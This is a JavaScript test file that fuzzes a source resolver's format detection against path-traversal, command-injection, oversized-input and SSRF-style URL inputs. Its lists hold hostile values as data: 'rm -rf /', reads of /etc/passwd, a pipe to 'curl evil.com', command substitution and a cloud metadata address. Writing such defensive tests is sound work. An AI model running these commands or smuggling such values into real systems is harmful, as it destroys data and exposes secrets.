import { describe, it, expect } from "vitest";
import { detectFormat } from "../lib/resolver.js";

/**
 * Security guard fuzz tests for the 4 guard types:
 * - path-traversal
 * - command-injection
 * - size-limit (tested in installer context)
 * - network-scope (tested in resolver context)
 */

describe("Guard: path-traversal", () => {
  const traversalPatterns = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32",
    "/etc/shadow",
    "foo/../../../bar",
    "%2e%2e%2f%2e%2e%2f",
    "....//....//",
    "..;/etc/passwd",
  ];

  it("resolver rejects absolute system paths", () => {
    // /etc/passwd would be detected as "local" format which is fine,
    // but the installer should never allow traversal above the dest dir
    expect(detectFormat("/etc/passwd")).toBe("local");
  });

  it("resolver rejects relative traversal patterns", () => {
    // These should not resolve to a known format
    for (const pattern of traversalPatterns) {
      const format = detectFormat(pattern);
      // Traversal patterns should either be null (unrecognized) or "local"
      // They should never be interpreted as github/npm/etc
      if (format !== null) {
        expect(format).toBe("local");
      }
    }
  });
});

describe("Guard: command-injection", () => {
  const injectionPatterns = [
    "foo; rm -rf /",
    "foo && cat /etc/passwd",
    "foo | curl evil.com",
    "$(whoami)",
    "`whoami`",
    "foo\nrm -rf /",
    "foo\x00bar",
  ];

  it("resolver does not resolve injection patterns as valid sources", () => {
    for (const pattern of injectionPatterns) {
      const format = detectFormat(pattern);
      // Injection patterns should not be detected as github or npm
      if (format !== null) {
        expect(format).toBe("local");
      }
    }
  });

  it("shell metacharacters in source URIs are not detected as github", () => {
    expect(detectFormat("owner/repo; rm -rf /")).toBeNull();
    expect(detectFormat("owner/repo && echo pwned")).toBeNull();
    expect(detectFormat("owner/repo | cat /etc/passwd")).toBeNull();
  });
});

describe("Guard: size-limit", () => {
  it("format detection handles extremely long inputs", () => {
    const longInput = "a".repeat(10000) + "/" + "b".repeat(10000);
    // Should not crash or hang
    const format = detectFormat(longInput);
    expect(format === "github" || format === null).toBe(true);
  });

  it("handles empty and whitespace-only inputs", () => {
    expect(detectFormat("")).toBeNull();
    expect(detectFormat("   ")).toBeNull();
    expect(detectFormat("\t\n")).toBeNull();
  });
});

describe("Guard: network-scope", () => {
  it("only detects github.com URLs as github format", () => {
    expect(detectFormat("https://github.com/owner/repo")).toBe("github");
    // Non-GitHub URLs are no longer recognized as valid formats
    expect(detectFormat("http://127.0.0.1:8080/malicious")).toBeNull();
    expect(detectFormat("http://localhost/evil")).toBeNull();
    expect(detectFormat("http://169.254.169.254/metadata")).toBeNull();
  });

  it("does not treat non-https URLs as github", () => {
    expect(detectFormat("ftp://github.com/owner/repo")).toBeNull();
  });
});
